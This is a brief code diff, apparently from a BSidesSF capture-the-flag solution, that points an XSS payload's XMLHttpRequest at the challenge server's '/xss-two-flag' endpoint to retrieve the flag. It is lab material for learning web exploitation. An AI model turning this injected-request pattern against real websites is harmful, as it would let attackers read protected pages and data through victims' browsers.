@@ -8,7 +8,7 @@ xhr.onload = function() {
 };
 
 console.log("works");
-xhr.open('GET','/xss-two-flag',true);
+xhr.open('GET','https://web-tutorial-2-3ebcc611.challenges.bsidessf.net/xss-two-flag',true);
 xhr.send();
 
 
